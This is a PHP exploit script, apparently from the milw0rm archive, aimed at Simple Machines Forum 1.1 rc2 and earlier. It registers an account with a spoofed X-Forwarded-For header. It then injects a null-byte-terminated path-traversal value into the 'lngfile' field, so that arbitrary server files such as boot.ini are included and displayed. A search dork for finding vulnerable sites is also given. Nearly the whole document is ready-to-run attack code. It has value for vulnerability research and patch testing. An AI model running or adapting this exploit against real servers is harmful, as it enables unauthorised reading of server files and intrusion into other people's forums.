#!/usr/bin/php -q -d short_open_tag=on
<?
print_r('
--------------------------------------------------------------------------------
Simple Machines Forum <= 1.1 rc2 "lngfile" Zend_Hash_Del_Key_Or_Index/arbitrary
local inclusion exploit (Win boxes)
by rgod rgod@autistici.org
site: http://retrogod.altervista.org
dork: "Powered by SMF"
--------------------------------------------------------------------------------
');
/*
works against Win boxes
regardless of php.ini settings
against PHP < 4.3.3, PHP 5 < 5.1.4
*/

if ($argc<5) {
print_r('
--------------------------------------------------------------------------------
Usage: php '.$argv[0].' host path mail include OPTIONS
host:      target server (ip/hostname)
path:      path to SMF
mail:      your email, required for activation
include:   path to file you want to include
Options:
   -p[port]:    specify a port other than 80
   -P[ip:port]: specify a proxy
Examples:
php '.$argv[0].' localhost /smf/ youremail@hotmail.com ../../../../../boot.ini
php '.$argv[0].' localhost /smf/ youremail@hotmail.com ../../../../../boot.ini -p81
php '.$argv[0].' localhost / youremail@hotmail.com ../../../../../boot.ini -P1.1.1.1:80
--------------------------------------------------------------------------------
');
die;
}

error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout",5);

function quick_dump($string)
{
  $result='';$exa='';$cont=0;
  for ($i=0; $i<=strlen($string)-1; $i++)
  {
   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
   {$result.="  .";}
   else
   {$result.="  ".$string[$i];}
   if (strlen(dechex(ord($string[$i])))==2)
   {$exa.=" ".dechex(ord($string[$i]));}
   else
   {$exa.=" 0".dechex(ord($string[$i]));}
   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
  }
 return $exa."\r\n".$result;
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
function sendpacketii($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.$host.':'.$port; die;
    }
  }
  else {
	$c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode(':',$proxy);
    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';die;
	}
  }
  fputs($ock,$packet);
  if ($proxy=='') {
    $html='';
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
  #debug
  #echo "\r\n".$html;
}

function make_seed()
{
   list($usec, $sec) = explode(' ', microtime());
   return (float) $sec + ((float) $usec * 100000);
}

$host=$argv[1];
$path=$argv[2];
$email=$argv[3];
$include=$argv[4];
$port=80;
$proxy="";

for ($i=3; $i<$argc; $i++){
$temp=$argv[$i][0].$argv[$i][1];
if ($temp=="-p")
{
  $port=str_replace("-p","",$argv[$i]);
}
if ($temp=="-P")
{
  $proxy=str_replace("-P","",$argv[$i]);
}
}
if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}

srand(make_seed());
$anumber = rand(1,9999999);
$user="sun-tzu".$anumber;
$pass="sun-tzu".$anumber;
$packet ="GET ".$p."index.php?action=register HTTP/1.0\r\n";
$packet.="X-FORWARDED-FOR: 1.1.1.1\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n\r\n";
$packet.=$data;
sendpacketii($packet);
$temp=explode("Set-Cookie: ",$html);
$cookie="";
for ($i=1; $i<count($temp); $i++)
{
 $temp2=explode(" ",$temp[$i]);
 $cookie.=" ".$temp2[0];
}
$temp=explode("PHPSESSID=",$cookie);
$temp2=explode(";",$temp[1]);
$sessid=$temp2[0];

$data="user=".$user;
$data.="&email=".$email;
$data.="&hideEmail=1";
$data.="&passwrd1=".$pass;
$data.="&passwrd2=".$pass;
$data.="&regagree=on";
$data.="&lngfile=%2f".$include."%00";
$data.="&1412642694=1";
$data.="&850639942=1";
$data.="&regSubmit=Register";
$packet ="POST ".$p."index.php?action=register2 HTTP/1.0\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Accept-Language: en\r\n";
$packet.="Accept-Encoding: gzip, deflate\r\n";
$packet.="Referer: http://".$host.$path."index.php?PHPSESSID=$sessid\r\n";
$packet.="User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\r\n";
$packet.="Cache-Control: no-cache\r\n";
$packet.="Cookie: $cookie\r\n";
$packet.="Content-Type: application/x-www-form-urlencoded\r\n";
$packet.="Content-Length: ".strlen($data)."\r\n";
$packet.="Connection: Close\r\n\r\n";
$packet.=$data;
sendpacketii($packet);
print_r("
now login with user: ".$user." pass: ".$pass." and you will see
".basename($include)." file at screen...
");
?>

# milw0rm.com [2006-08-20]
